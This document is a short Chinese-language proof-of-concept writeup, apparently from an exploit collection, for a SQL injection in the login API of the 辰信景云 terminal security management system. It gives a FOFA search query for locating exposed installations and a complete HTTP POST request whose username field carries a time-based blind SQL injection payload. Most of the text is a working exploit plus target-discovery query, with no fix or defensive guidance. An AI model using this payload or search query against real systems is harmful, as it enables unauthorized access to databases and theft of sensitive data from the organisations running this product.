# 辰信景云终端安全管理系统login  SQL注入漏洞 

## 1.漏洞描述

辰信景云终端安全管理系统 login 存在 SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 2.搜索语法

```plain
fofa："辰信景云终端安全管理系统" && icon_hash="-429260979"
```

## 3.漏洞复现

```plain
POST /api/user/login HTTP/2
Host: 127.0.0.1
Content-Length: 102
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='
```

![image](https://github.com/hardog123/poc-exp/assets/170905460/5dac62c6-19f2-42f3-a664-e73dbc93aba8)
